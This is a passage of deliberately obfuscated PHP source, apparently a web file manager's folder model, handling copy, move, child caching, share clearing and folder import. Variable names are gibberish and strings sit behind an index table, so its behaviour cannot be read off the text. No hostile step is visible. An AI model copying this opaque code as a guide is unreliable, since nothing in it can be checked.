($ˆùôèº¥[$­Ö¾ŒØÚ[469]] == $­Ö¾ŒØÚ[91] && $¨ú ‘¦û == $¨„Á¹ƒ) { $this->folderSizeResetChildren($¨ú ‘¦û); } Model($­Ö¾ŒØÚ[616])->addAll($Éã¹—¨[$­Ö¾ŒØÚ[614]], array(), !0); if ($¨ú ‘¦û != $¨„Á¹ƒ || $ˆùôèº¥[$­Ö¾ŒØÚ[469]] == $­Ö¾ŒØÚ[91]) { Model($­Ö¾ŒØÚ[617])->eventCopy($¨„Á¹ƒ); } $this->saveAll($Éã¹—¨[$­Ö¾ŒØÚ[615]]); Model($­Ö¾ŒØÚ[221])->linkAdd($Éã¹—¨[$­Ö¾ŒØÚ[613]]); $this->folderSizeReset($ò´ÊÅ¤Å); $this->updateModifyTime($ò´ÊÅ¤Å); return $¨„Á¹ƒ; } private function _copy($“âì­ìå, $ª³øš€´, $‹ÂÊİ², &$¬ï¥âÀì, $„Ö³¨äÖ, $¬‰ú‚Äû = '') { $ºù»­Û¦ =& $_SERVER[º·Ï‹¥³]; $ÀÀÃ§Æß = $this->sourceInfoCache($“âì­ìå); $ÓêÀÌ¾í = $ÀÀÃ§Æß[$ºù»­Û¦[469]] == $ºù»­Û¦[91]; $ÌŠÃªÇš = $¬‰ú‚Äû ? $¬‰ú‚Äû : $ÀÀÃ§Æß[$ºù»­Û¦[32]]; $©Æµò›‡ = $this->fileNameExistAuto($ª³øš€´, $ÀÀÃ§Æß); if ($„Ö³¨äÖ) { $this->_childrenAllMake($“âì­ìå); if ($ÓêÀÌ¾í && $©Æµò›‡) { $this->_childrenAllMake($©Æµò›‡); } } if (!$©Æµò›‡) { return $this->_copyCreate($“âì­ìå, $ª³øš€´, $ÌŠÃªÇš, $¬ï¥âÀì); } $—•Á˜á¡ = $©Æµò›‡; if ($ÓêÀÌ¾í) { if ($‹ÂÊİ² == REPEAT_RENAME_FOLDER) { $ÌŠÃªÇš = $this->fileNameAutoCache($ª³øš€´, $ÌŠÃªÇš, $‹ÂÊİ², $ÓêÀÌ¾í); $—•Á˜á¡ = $this->_copyCreate($“âì­ìå, $ª³øš€´, $ÌŠÃªÇš, $¬ï¥âÀì); } else { $û¿ÅÌ­¸ = $this->_childrenList($“âì­ìå); foreach ($û¿ÅÌ­¸ as $”ÈâëÃ) { $this->_copy($”ÈâëÃ[$ºù»­Û¦[184]], $©Æµò›‡, $‹ÂÊİ², $¬ï¥âÀì, !1); } } } else { if ($‹ÂÊİ² == REPEAT_RENAME || $‹ÂÊİ² == REPEAT_RENAME_FOLDER) { $ÌŠÃªÇš = $this->fileNameAutoCache($ª³øš€´, $ÌŠÃªÇš, $‹ÂÊİ², $ÓêÀÌ¾í); $—•Á˜á¡ = $this->_copyCreate($“âì­ìå, $ª³øš€´, $ÌŠÃªÇš, $¬ï¥âÀì); } else { if ($‹ÂÊİ² == REPEAT_REPLACE) { $Æ‰öıíË = $this->sourceInfoCache($©Æµò›‡); $ Ø¢ÃĞå = $this->fileHistory($Æ‰öıíË, $ÀÀÃ§Æß[$ºù»­Û¦[525]], $ÀÀÃ§Æß[$ºù»­Û¦[79]]); if ($ Ø¢ÃĞå) { $¬ï¥âÀì[$ºù»­Û¦[613]][] = $ÀÀÃ§Æß[$ºù»­Û¦[525]]; } } else { if ($‹ÂÊİ² == REPEAT_SKIP) { } } } Hook::trigger($ºù»­Û¦[618], array($ºù»­Û¦[619], $ÀÀÃ§Æß, 0)); } return $—•Á˜á¡; } private function _copyCreate($Ñ›ã• ò, $…­²Ñ‘Ÿ, $æ”÷´š, &$ÅÀ’—ËŞ) { $êÇ˜·ª» =& $_SERVER[º·Ï‹¥³]; $¨øÀÖÉ = $this->sourceInfoCache($Ñ›ã• ò); $®İ¾ãİ¸ = $this->sourceInfoCache($…­²Ñ‘Ÿ); $ÁÇƒ¢Ä× = $this->_makeItemData($¨øÀÖÉ, $®İ¾ãİ¸, $æ”÷´š); Hook::trigger($êÇ˜·ª»[620], $ÁÇƒ¢Ä×); Hook::trigger($êÇ˜·ª»[621], array($êÇ˜·ª»[622], $ÁÇƒ¢Ä×, 0)); $ã¨äÈ×÷ = $this->add($ÁÇƒ¢Ä×); $Éıƒ—¨× = array($êÇ˜·ª»[184] => $ã¨äÈ×÷, $êÇ˜·ª»[32] => $æ”÷´š); $this->_copyApplyMeta($Éıƒ—¨×, $ÅÀ’—ËŞ); if ($¨øÀÖÉ[$êÇ˜·ª»[469]] != $êÇ˜·ª»[91]) { $ÅÀ’—ËŞ[$êÇ˜·ª»[613]][] = $¨øÀÖÉ[$êÇ˜·ª»[525]]; return $ã¨äÈ×÷; } $ÊÀÊµ°Ô = array(); $¢êÛÒá» = array(); $this->_childrenListAll($Ñ›ã• ò, $ÊÀÊµ°Ô); $èÃÖË“’ = count($ÊÀÊµ°Ô); if ($èÃÖË“’ == 0) { return $ã¨äÈ×÷; } $²éÈË½Ö = $this->sourceInfo($ã¨äÈ×÷); foreach ($ÊÀÊµ°Ô as $Ü¾‰ë»è) { $Ãéª‘«Ñ = $this->_makeItemData($Ü¾‰ë»è, $²éÈË½Ö, $Ü¾‰ë»è[$êÇ˜·ª»[32]]); $Ãéª‘«Ñ[$êÇ˜·ª»[569]] = $Ü¾‰ë»è[$êÇ˜·ª»[569]]; $¢êÛÒá»[] = $Ãéª‘«Ñ; } $this->chunkEventSet($êÇ˜·ª»[623], array($êÇ˜·ª»[624], $ÁÇƒ¢Ä×, $èÃÖË“’)); $this->addAll($¢êÛÒá», array(), !1); $±ÖÄã…» = $this->where(array($êÇ˜·ª»[183] => $ã¨äÈ×÷))->select(); $òñŸ¹ŞÈ = $this->_childrenMakeRelation($ÊÀÊµ°Ô, $±ÖÄã…»); $òñŸ¹ŞÈ[$Ñ›ã• ò] = $ã¨äÈ×÷; $Õ»˜Õï› = array(); $ªœª¨áÉ = array(); foreach ($±ÖÄã…» as $Ü¾‰ë»è) { $øÕˆî¦í = $Ü¾‰ë»è[$êÇ˜·ª»[184]]; $õĞóÏ§· = $this->_childrenMatch($òñŸ¹ŞÈ, $Ü¾‰ë»è, $²éÈË½Ö); $Õ»˜Õï›[] = array($êÇ˜·ª»[184], $øÕˆî¦í, $êÇ˜·ª»[183], $õĞóÏ§·[$êÇ˜·ª»[183]]); $ªœª¨áÉ[] = array($êÇ˜·ª»[184], $øÕˆî¦í, $êÇ˜·ª»[569], $õĞóÏ§·[$êÇ˜·ª»[569]]); $this->_copyApplyMeta($Ü¾‰ë»è, $ÅÀ’—ËŞ); if ($Ü¾‰ë»è[$êÇ˜·ª»[469]] != $êÇ˜·ª»[91]) { $ÅÀ’—ËŞ[$êÇ˜·ª»[613]][] = $Ü¾‰ë»è[$êÇ˜·ª»[525]]; } } $this->chunkEventSet($êÇ˜·ª»[625], array($êÇ˜·ª»[626], $ÁÇƒ¢Ä×, $èÃÖË“’)); $this->saveAll($Õ»˜Õï›); $this->chunkEventSet($êÇ˜·ª»[627], array($êÇ˜·ª»[628], $ÁÇƒ¢Ä×, $èÃÖË“’)); $this->saveAll($ªœª¨áÉ); return $ã¨äÈ×÷; } private function _childrenMakeRelation($îŞåÚ¶, $¼°ÛŸ¿¿) { $ç†úíùÏ =& $_SERVER[º·Ï‹¥³]; $È®‰•å = array(); $…óğŒ” = array(); foreach ($îŞåÚ¶ as $¨·ÈøÚ) { $’€’Ù•‡ = $¨·ÈøÚ[$ç†úíùÏ[32]] . $ç†úíùÏ[8] . $¨·ÈøÚ[$ç†úíùÏ[569]]; $È®‰•å[$’€’Ù•‡] = $¨·ÈøÚ[$ç†úíùÏ[184]]; } foreach ($¼°ÛŸ¿¿ as $¨·ÈøÚ) { $’€’Ù•‡ = $¨·ÈøÚ[$ç†úíùÏ[32]] . $ç†úíùÏ[8] . $¨·ÈøÚ[$ç†úíùÏ[569]]; $Å¹Ÿ ‘‘ = $È®‰•å[$’€’Ù•‡]; $…óğŒ”[$Å¹Ÿ ‘‘] = $¨·ÈøÚ[$ç†úíùÏ[184]]; } return $…óğŒ”; } private function _childrenMatch($˜ò€’¯Ş, $¢ÌÎ…¸Å, $—§›Ğ) { $ú¢¶àöˆ =& $_SERVER[º·Ï‹¥³]; $ãÇ€â•† = $—§›Ğ[$ú¢¶àöˆ[569]]; $ã–ğÛó = $this->parentLevelArray($¢ÌÎ…¸Å[$ú¢¶àöˆ[569]]); foreach ($ã–ğÛó as $·‚ˆ§ğä) { if (isset($˜ò€’¯Ş[$·‚ˆ§ğä])) { $ãÇ€â•† .= $˜ò€’¯Ş[$·‚ˆ§ğä] . $ú¢¶àöˆ[629]; } } $ãÇ€â•† = rtrim($ãÇ€â•†, $ú¢¶àöˆ[50]) . $ú¢¶àöˆ[50]; $°İØŸÌ— = $this->parentLevelArray($ãÇ€â•†); $ÕõÊü‚š = $°İØŸÌ—[count($°İØŸÌ—) - 1]; return array($ú¢¶àöˆ[183] => $ÕõÊü‚š, $ú¢¶àöˆ[569] => $ãÇ€â•†); } private function _makeItemData($ÒÃÖâ¹·, $‹óåéÇş, $ÔÅÁÒïß) { $¿º¨óõ =& $_SERVER[º·Ï‹¥³]; $µü•Ü‰™ = array($¿º¨óõ[630] => $ÒÃÖâ¹·[$¿º¨óõ[469]], $¿º¨óõ[478] => $ÔÅÁÒïß, $¿º¨óõ[631] => $ÒÃÖâ¹·[$¿º¨óõ[470]] ? $ÒÃÖâ¹·[$¿º¨óõ[470]] : $¿º¨óõ[12], $¿º¨óõ[526] => $ÒÃÖâ¹·[$¿º¨óõ[525]] ? $ÒÃÖâ¹·[$¿º¨óõ[525]] : 0, $¿º¨óõ[601] => $ÒÃÖâ¹·[$¿º¨óõ[79]] ? $ÒÃÖâ¹·[$¿º¨óõ[79]] : 0, $¿º¨óõ[632] => intval($‹óåéÇş[$¿º¨óõ[181]]), $¿º¨óõ[633] => intval($‹óåéÇş[$¿º¨óõ[554]]), $¿º¨óõ[634] => intval(USER_ID), $¿º¨óõ[635] => intval(USER_ID), $¿º¨óõ[461] => intval($‹óåéÇş[$¿º¨óõ[184]]), $¿º¨óõ[636] => $‹óåéÇş[$¿º¨óõ[569]] . $‹óåéÇş[$¿º¨óõ[184]] . $¿º¨óõ[50], $¿º¨óõ[482] => $ÒÃÖâ¹·[$¿º¨óõ[88]] ? $ÒÃÖâ¹·[$¿º¨óõ[88]] : time(), $¿º¨óõ[488] => 0, $¿º¨óõ[637] => $¿º¨óõ[12]); return $µü•Ü‰™; } private function _copyApplyMeta($ïÖÈàÓº, &$²ÖÃÙ‘î) { $¹ò˜®‹Ş =& $_SERVER[º·Ï‹¥³]; $‘±½·øÍ = $ïÖÈàÓº[$¹ò˜®‹Ş[184]]; $³§÷ÑšÉ = $ïÖÈàÓº[$¹ò˜®‹Ş[32]]; if (!isset($ïÖÈàÓº[$¹ò˜®‹Ş[638]]) || !$ïÖÈàÓº[$¹ò˜®‹Ş[638]] || $ïÖÈàÓº[$¹ò˜®‹Ş[638]] == $¹ò˜®‹Ş[219]) { $²ÖÃÙ‘î[$¹ò˜®‹Ş[615]][] = array($¹ò˜®‹Ş[184], $‘±½·øÍ, $¹ò˜®‹Ş[638], short_id($‘±½·øÍ)); } if (Input::check($³§÷ÑšÉ, $¹ò˜®‹Ş[639])) { $²ÖÃÙ‘î[$¹ò˜®‹Ş[614]][] = array($¹ò˜®‹Ş[184] => $‘±½·øÍ, $¹ò˜®‹Ş[97] => $¹ò˜®‹Ş[522], $¹ò˜®‹Ş[434] => str_replace($¹ò˜®‹Ş[53], $¹ò˜®‹Ş[12], Pinyin::get($³§÷ÑšÉ))); $²ÖÃÙ‘î[$¹ò˜®‹Ş[614]][] = array($¹ò˜®‹Ş[184] => $‘±½·øÍ, $¹ò˜®‹Ş[97] => $¹ò˜®‹Ş[521], $¹ò˜®‹Ş[434] => Pinyin::get($³§÷ÑšÉ, $¹ò˜®‹Ş[640])); } $²ÖÃÙ‘î[$¹ò˜®‹Ş[614]][] = array($¹ò˜®‹Ş[184] => $‘±½·øÍ, $¹ò˜®‹Ş[97] => $¹ò˜®‹Ş[501], $¹ò˜®‹Ş[434] => KodSort::makeStr($³§÷ÑšÉ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($›†Ï²“É) { $Ï›éìÄ =& $_SERVER[º·Ï‹¥³]; $à†ßó”÷ = $this->sourceInfo($›†Ï²“É); $¬»€±ìá = $Ï›éìÄ[641]; $ùÆ¢‹ƒ‰ = array($Ï›éìÄ[569] => array($Ï›éìÄ[596], $à†ßó”÷[$Ï›éìÄ[569]] . $›†Ï²“É . $Ï›éìÄ[597]), $Ï›éìÄ[489] => $this->targetIsDelete); $¬ã¨Åñ = $this->field($¬»€±ìá)->where($ùÆ¢‹ƒ‰)->select(); if (!$¬ã¨Åñ) { return; } $¬ã¨Åñ = array_to_keyvalue($¬ã¨Åñ, $Ï›éìÄ[184]); foreach ($¬ã¨Åñ as $§Åí®şû) { $ËìëúõÌ = $§Åí®şû[$Ï›éìÄ[183]]; $›†Ï²“É = $§Åí®şû[$Ï›éìÄ[184]]; if (!isset($this->_childrenListCache[$›†Ï²“É]) && $§Åí®şû[$Ï›éìÄ[469]] == $Ï›éìÄ[91]) { $this->_childrenListCache[$›†Ï²“É] = array(); } if (!isset($this->_childrenListCache[$ËìëúõÌ])) { $this->_childrenListCache[$ËìëúõÌ] = array(); } $this->_childrenListCache[$ËìëúõÌ][$›†Ï²“É] = $§Åí®şû; $this->_childrenItemCache[$›†Ï²“É] = $§Åí®şû; } } private function _childrenListAll($ê©ûÛáİ, &$İÎ­Á’À) { $à³¾±öƒ =& $_SERVER[º·Ï‹¥³]; if (!isset($this->_childrenListCache[$ê©ûÛáİ])) { return; } $Ó…¾Ô· = $this->_childrenListCache[$ê©ûÛáİ]; foreach ($Ó…¾Ô· as $áúá¦©‡ => $—ˆá°Ò) { $İÎ­Á’À[$áúá¦©‡] = $—ˆá°Ò; if ($—ˆá°Ò[$à³¾±öƒ[469]] == $à³¾±öƒ[91]) { $this->_childrenListAll($áúá¦©‡, $İÎ­Á’À); } } } private function sourceInfoCache($ŒË§²„) { if (isset($this->_childrenItemCache[$ŒË§²„])) { return $this->_childrenItemCache[$ŒË§²„]; } return $this->sourceInfo($ŒË§²„); } private function _childrenList($Ê›Ô’È) { if (isset($this->_childrenListCache[$Ê›Ô’È])) { return $this->_childrenListCache[$Ê›Ô’È]; } return $this->_childrenListSelect($Ê›Ô’È); } private function _childrenListSelect($´¸ÉÛ‘Ò) { $ÌÈÂ¶·ş =& $_SERVER[º·Ï‹¥³]; $¨‰æ÷Êü = array($ÌÈÂ¶·ş[183] => $´¸ÉÛ‘Ò, $ÌÈÂ¶·ş[489] => $this->targetIsDelete); $ŞÄ§‰›¨ = $this->where($¨‰æ÷Êü)->select(); $ŞÄ§‰›¨ = $ŞÄ§‰›¨ ? $ŞÄ§‰›¨ : array(); $º·°Şõá = array_to_keyvalue($ŞÄ§‰›¨, $ÌÈÂ¶·ş[184]); $this->_childrenListCache[$´¸ÉÛ‘Ò] = $º·°Şõá; foreach ($º·°Şõá as $´¸ÉÛ‘Ò => $À«÷ˆ¯) { $this->_childrenItemCache[$´¸ÉÛ‘Ò] = $À«÷ˆ¯; } return $º·°Şõá; } private function fileNameExistAuto($é¤ñç¢ş, $ËÒ»Ü›°) { $´Èƒ„„” =& $_SERVER[º·Ï‹¥³]; if ($ËÒ»Ü›°[$´Èƒ„„”[489]] == $´Èƒ„„”[91]) { return $this->fileNameExist($é¤ñç¢ş, $ËÒ»Ü›°[$´Èƒ„„”[32]]); } return $this->fileNameExistCache($é¤ñç¢ş, $ËÒ»Ü›°[$´Èƒ„„”[32]]); } private function fileNameExistCache($øÈŞÓ¢†, $Û½—…—¬) { $ÃşôÔÖ =& $_SERVER[º·Ï‹¥³]; $Û½—…—¬ = strtolower($Û½—…—¬); $´à¦„¶ˆ = $this->_childrenList($øÈŞÓ¢†); foreach ($´à¦„¶ˆ as $—ñÒ‘éÍ) { if ($Û½—…—¬ == strtolower($—ñÒ‘éÍ[$ÃşôÔÖ[32]])) { return $—ñÒ‘éÍ[$ÃşôÔÖ[184]]; } } return !1; } private function fileNameAutoCache($–×íæŒâ, $ªı­İù, $òşÖè¼Ì, $§áÙÉÉÍ) { $ú‘ê¹ =& $_SERVER[º·Ï‹¥³]; $Õ’ë™½Ë = $this->_childrenList($–×íæŒâ); $„×“Ù‹› = array_to_keyvalue($Õ’ë™½Ë, $ú‘ê¹[12], $ú‘ê¹[32]); return $this->fileNameAutoGet($„×“Ù‹›, $ªı­İù, $òşÖè¼Ì, $§áÙÉÉÍ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ÖÛó·ä‰, $¸÷’¬Îï, $‹’ïĞà = REPEAT_REPLACE, $¢çÈıªÅ = '') { $Â‘‘Û¤ =& $_SERVER[º·Ï‹¥³]; $–Í®úìñ = $this->sourceInfo($ÖÛó·ä‰); $³òÅÊšÚ = $this->sourceInfo($¸÷’¬Îï); if ($–Í®úìñ[$Â‘‘Û¤[183]] == $³òÅÊšÚ[$Â‘‘Û¤[184]]) { if ($–Í®úìñ[$Â‘‘Û¤[489]] == $Â‘‘Û¤[91]) { Model($Â‘‘Û¤[487])->restore(array($ÖÛó·ä‰)); } if (!$¢çÈıªÅ || $¢çÈıªÅ == $–Í®úìñ[$Â‘‘Û¤[32]]) { return $ÖÛó·ä‰; } } $Ï›¡¯… = $this->pathInfoMore($ÖÛó·ä‰); if ($this->isParentOf($ÖÛó·ä‰, $¸÷’¬Îï)) { return !1; } if (!$–Í®úìñ || !$³òÅÊšÚ || $³òÅÊšÚ[$Â‘‘Û¤[469]] != $Â‘‘Û¤[91]) { return !1; } Hook::trigger($Â‘‘Û¤[642], $Ï›¡¯…); $this->targetIsDelete = intval($–Í®úìñ[$Â‘‘Û¤[489]]); if ($–Í®úìñ[$Â‘‘Û¤[183]] == $¸÷’¬Îï && $¢çÈıªÅ != $–Í®úìñ[$Â‘‘Û¤[32]]) { $Ö Õ¸… = $this->fileNameExist($¸÷’¬Îï, $¢çÈıªÅ); if ($Ö Õ¸… && $–Í®úìñ[$Â‘‘Û¤[469]] == $Â‘‘Û¤[219]) { $³¹õŸ¸ü = $this->sourceInfo($Ö Õ¸…); $£”†×ñ„ = $this->fileHistory($³¹õŸ¸ü, $–Í®úìñ[$Â‘‘Û¤[525]], $–Í®úìñ[$Â‘‘Û¤[79]]); if (!$£”†×ñ„) { Model($Â‘‘Û¤[528])->remove($–Í®úìñ[$Â‘‘Û¤[525]]); } $this->removeNow($ÖÛó·ä‰, !1); $this->folderSizeReset($¸÷’¬Îï); Hook::trigger($Â‘‘Û¤[643], $Ï›¡¯…); return $Ö Õ¸…; } } $¥ë»Ú±º = $¢çÈıªÅ ? $¢çÈıªÅ : $–Í®úìñ[$Â‘‘Û¤[32]]; $this->lockMoveStart($ÖÛó·ä‰); $this->lockWriteStart($¸÷’¬Îï, $¥ë»Ú±º); $ªĞÇÔäì = array($Â‘‘Û¤[613] => array(), $Â‘‘Û¤[644] => !1); $this->clearShare($ÖÛó·ä‰, $¸÷’¬Îï); $©Ù©Î¶ = $this->fileNameExistAuto($¸÷’¬Îï, $–Í®úìñ); $ê©«ğ• = $this->_move($ÖÛó·ä‰, $¸÷’¬Îï, $‹’ïĞà, $ªĞÇÔäì, $¢çÈıªÅ); $this->sourceCacheClear(); if ($–Í®úìñ[$Â‘‘Û¤[469]] == $Â‘‘Û¤[91] && $©Ù©Î¶) { $this->folderSizeResetChildren($ê©«ğ•); } Model($Â‘‘Û¤[221])->linkAdd($ªĞÇÔäì[$Â‘‘Û¤[613]]); if ($©Ù©Î¶ && $ªĞÇÔäì[$Â‘‘Û¤[644]]) { $this->removeNow($ÖÛó·ä‰, !1); } $this->lockMoveEnd($ÖÛó·ä‰); $this->lockWriteEnd($¸÷’¬Îï, $¥ë»Ú±º); $this->folderSizeReset($–Í®úìñ[$Â‘‘Û¤[183]]); $this->folderSizeReset($¸÷’¬Îï); $Ã·¨ÀòÀ = array($–Í®úìñ[$Â‘‘Û¤[183]], $¸÷’¬Îï); if ($–Í®úìñ[$Â‘‘Û¤[469]] == $Â‘‘Û¤[91]) { $Ã·¨ÀòÀ[] = $ÖÛó·ä‰; } $this->updateModifyTime($Ã·¨ÀòÀ); Model($Â‘‘Û¤[617])->eventMove($ÖÛó·ä‰, $–Í®úìñ[$Â‘‘Û¤[183]], $¸÷’¬Îï); Hook::trigger($Â‘‘Û¤[643], $Ï›¡¯…); return $ê©«ğ•; } private function _move($ÃÉâÕíª, $…–ôÔ½, $î¸Çú©, &$âæİñ‹¡, $Ù‹öçĞ” = '') { $İˆÌ¤£ =& $_SERVER[º·Ï‹¥³]; $ì€ÍÄü = $this->sourceInfo($ÃÉâÕíª); $Ÿ²Ù¯¯¦ = $ì€ÍÄü[$İˆÌ¤£[469]] == $İˆÌ¤£[91]; $²Ûüéñ = $Ù‹öçĞ” ? $Ù‹öçĞ” : $ì€ÍÄü[$İˆÌ¤£[32]]; $¢™äéˆ = $this->fileNameExistAuto($…–ôÔ½, $ì€ÍÄü); $this->lockMoveStart($ÃÉâÕíª); $this->lockWriteStart($…–ôÔ½, $²Ûüéñ); if (!$¢™äéˆ) { return $this->_moveForce($ÃÉâÕíª, $…–ôÔ½, $²Ûüéñ); } $©ª­îÓË = $¢™äéˆ; $Ñºğ—†Œ = !1; if ($Ÿ²Ù¯¯¦) { if ($î¸Çú© == REPEAT_RENAME_FOLDER) { $²Ûüéñ = $this->fileNameAuto($…–ôÔ½, $²Ûüéñ, $î¸Çú©, $Ÿ²Ù¯¯¦); $©ª­îÓË = $this->_moveForce($ÃÉâÕíª, $…–ôÔ½, $²Ûüéñ); } else { if ($î¸Çú© == REPEAT_RENAME_FOLDER) { $î¸Çú© = REPEAT_RENAME; } $Ä¼÷âÍ = $this->_childrenListSelect($ÃÉâÕíª); foreach ($Ä¼÷âÍ as $´¿“ïôœ) { $this->_move($´¿“ïôœ[$İˆÌ¤£[184]], $¢™äéˆ, $î¸Çú©, $âæİñ‹¡); } $Ñºğ—†Œ = !0; } } else { if ($î¸Çú© == REPEAT_SKIP) { $Ñºğ—†Œ = !0; } else { if ($î¸Çú© == REPEAT_RENAME || $î¸Çú© == REPEAT_RENAME_FOLDER) { $²Ûüéñ = $this->fileNameAuto($…–ôÔ½, $²Ûüéñ, $î¸Çú©, $Ÿ²Ù¯¯¦); $©ª­îÓË = $this->_moveForce($ÃÉâÕíª, $…–ôÔ½, $²Ûüéñ); } else { if ($î¸Çú© == REPEAT_REPLACE) { $È¤ù ‰ı = $this->sourceInfoCache($¢™äéˆ); $Ñ²Ÿâµ— = $this->fileHistory($È¤ù ‰ı, $ì€ÍÄü[$İˆÌ¤£[525]], $ì€ÍÄü[$İˆÌ¤£[79]]); $Ñºğ—†Œ = !0; if ($Ñ²Ÿâµ—) { $âæİñ‹¡[$İˆÌ¤£[613]][] = $ì€ÍÄü[$İˆÌ¤£[525]]; } } } } } if ($Ñºğ—†Œ && !$âæİñ‹¡[$İˆÌ¤£[644]]) { $âæİñ‹¡[$İˆÌ¤£[644]] = !0; } return $©ª­îÓË; } private function _moveForce($ ×íµó, $î¸¹“¼, $Ãø”ìî) { $Àø½¨“æ =& $_SERVER[º·Ï‹¥³]; $Šñ…Ë„œ = $this->sourceInfo($ ×íµó); $½¨”ğ¦ = $this->sourceInfo($î¸¹“¼); $èÉ±¬Àò = $Šñ…Ë„œ[$Àø½¨“æ[469]] == $Àø½¨“æ[91]; $Æ†÷²İÎ = array($Àø½¨“æ[461] => $½¨”ğ¦[$Àø½¨“æ[184]], $Àø½¨“æ[636] => $½¨”ğ¦[$Àø½¨“æ[569]] . $½¨”ğ¦[$Àø½¨“æ[184]] . $Àø½¨“æ[50], $Àø½¨“æ[632] => $½¨”ğ¦[$Àø½¨“æ[181]], $Àø½¨“æ[633] => $½¨”ğ¦[$Àø½¨“æ[554]], $Àø½¨“æ[635] => USER_ID, $Àø½¨“æ[478] => $Ãø”ìî); $¸¹ùİ® = $Šñ…Ë„œ[$Àø½¨“æ[181]] == SourceModel::TYPE_GROUP && $½¨”ğ¦[$Àø½¨“æ[181]] == SourceModel::TYPE_GROUP && $Šñ…Ë„œ[$Àø½¨“æ[554]] == $½¨”ğ¦[$Àø½¨“æ[554]]; if (!$¸¹ùİ® && $this->moveClearAuth) { Model($Àø½¨“æ[552])->authClear($ ×íµó); } $Ô°¤ªşà = $Šñ…Ë„œ[$Àø½¨“æ[489]] == $Àø½¨“æ[91] && $½¨”ğ¦[$Àø½¨“æ[489]] != $Àø½¨“æ[91]; if ($Ô°¤ªşà) { $Æ†÷²İÎ[$Àø½¨“æ[488]] = 0; } if ($èÉ±¬Àò) { $—€§¡˜ = array($Àø½¨“æ[636] => array($Àø½¨“æ[596], $Šñ…Ë„œ[$Àø½¨“æ[569]] . $Šñ…Ë„œ[$Àø½¨“æ[184]] . $Àø½¨“æ[597])); $°‚ÀüíË = $Šñ…Ë„œ[$Àø½¨“æ[569]] . $Šñ…Ë„œ[$Àø½¨“æ[184]] . $Àø½¨“æ[50]; $×…º´å£ = $½¨”ğ¦[$Àø½¨“æ[569]] . $½¨”ğ¦[$Àø½¨“æ[184]] . $Àø½¨“æ[50] . $Šñ…Ë„œ[$Àø½¨“æ[184]] . $Àø½¨“æ[50]; $µ³”½³² = array($Àø½¨“æ[636] => array($Àø½¨“æ[645], "\x72\x65\160\154\x61\x63\145\50\x70\141\x72\x65\x6e\164\114\x65\x76\x65\x6c\x2c\47{$°‚ÀüíË}\x27\x2c\47{$×…º´å£}\x27\x29"), $Àø½¨“æ[632] => $½¨”ğ¦[$Àø½¨“æ[181]], $Àø½¨“æ[633] => $½¨”ğ¦[$Àø½¨“æ[554]]); if ($Ô°¤ªşà) { $µ³”½³²[$Àø½¨“æ[488]] = 0; } $this->where($—€§¡˜)->data($µ³”½³²)->save(); } $this->where(array($Àø½¨“æ[475] => $ ×íµó))->data($Æ†÷²İÎ)->save(); return $ ×íµó; } private function clearShare($«×³óÊ±, $¦Ì©Ëšï) { $ òèÌÑ¹ =& $_SERVER[º·Ï‹¥³]; $À£¤ó = $this->sourceInfo($«×³óÊ±); $’›İê”Û = $this->sourceInfo($¦Ì©Ëšï); if ($À£¤ó[$ òèÌÑ¹[554]] == $’›İê”Û[$ òèÌÑ¹[554]] && $À£¤ó[$ òèÌÑ¹[181]] == $ òèÌÑ¹[646]) { return; } $«©Ï¥Œ‚ = array($ òèÌÑ¹[569] => array($ òèÌÑ¹[596], $À£¤ó[$ òèÌÑ¹[569]] . $«×³óÊ± . $ òèÌÑ¹[597])); $šõÙÍ¼Š = $this->field($ òèÌÑ¹[475])->where($«©Ï¥Œ‚)->getField($ òèÌÑ¹[184], !0); if (!$šõÙÍ¼Š) { return; } $«©Ï¥Œ‚ = array($ òèÌÑ¹[184] => array($ òèÌÑ¹[7], $šõÙÍ¼Š), $ òèÌÑ¹[647] => 1); $¨²ù€çÍ = Model($ òèÌÑ¹[648])->field($ òèÌÑ¹[649])->where($«©Ï¥Œ‚)->select(); if (!$¨²ù€çÍ) { return; } $¨²ù€çÍ = array_to_keyvalue($¨²ù€çÍ, $ òèÌÑ¹[12], $ òèÌÑ¹[649]); $«©Ï¥Œ‚ = array($ òèÌÑ¹[649] => array($ òèÌÑ¹[7], $¨²ù€çÍ)); Model($ òèÌÑ¹[648])->where($«©Ï¥Œ‚)->save(array($ òèÌÑ¹[647] => 0)); Model($ òèÌÑ¹[650])->where($«©Ï¥Œ‚)->delete(); } public function copyFolderFromIO($Éö‡§ù·, $ÙŠêéáä, $Ş—É€Å, $àğÓ¸Ş, $¢ëÍı°, $—‚ÏòöÉ = false) { $àòÈÚÕ‡ =& $_SERVER[º·Ï‹¥³]; $®÷±à = array($àòÈÚÕ‡[614] => array(), $àòÈÚÕ‡[615] => array(), $àòÈÚÕ‡[613] => array(), $àòÈÚÕ‡[651] => array()); $Ê—íıË« = $—‚ÏòöÉ ? $—‚ÏòöÉ : $Éö‡§ù·->pathThis($ÙŠêéáä); $æÃ„Ú¬¦ = $this->fileNameExist($Ş—É€Å, $Ê—íıË«); $ÇœÜÚÁ = $this->mkdir($Ş—É€Å, $Ê—íıË«, $àğÓ¸Ş); if (!$æÃ„Ú¬¦ || $àğÓ¸Ş == REPEAT_RENAME_FOLDER) { $àğÓ¸Ş = !1; } if ($æÃ„Ú¬¦) { $this->_childrenAllMake($æÃ„Ú¬¦); } Hook::trigger($àòÈÚÕ‡[652]); $this->_copyChildTo($Éö‡§ù·, $ÙŠêéáä, $ÇœÜÚÁ, $àğÓ¸Ş, $®÷±à, $¢ëÍı°); Hook::trigger($àòÈÚÕ‡[653]); if ($ÇœÜÚÁ) { $this->folderSizeResetChildren($ÇœÜÚÁ); } $this->_childrenListClear(); Model($àòÈÚÕ‡[616])->addAll($®÷±à[$àòÈÚÕ‡[614]], array(), !0); Model($àòÈÚÕ‡[617])->eventCopy($ÇœÜÚÁ); $this->saveAll($®÷±à[$àòÈÚÕ‡[615]]); Model($àòÈÚÕ‡[528])->linkAdd($®÷±à[$àòÈÚÕ‡[613]]); Model($àòÈÚÕ‡[528])->remove($®÷±à[$àòÈÚÕ‡[651]]); $this->folderSizeReset($Ş—É€Å); $this->updateModifyTime($Ş—É€Å); return $ÇœÜÚÁ; } private function _copyChildTo($Ëâôƒ, $¯†Ÿ°Ü“, $Ë¸ïíÙÇ, $—ø·÷€, &$Â¦›ÊŠ°, $Ò»˜åÏ¹) { $ğœ¾ı£ˆ =& $_SERVER[º·Ï‹¥³]; $Ôö‡Ìõ† = 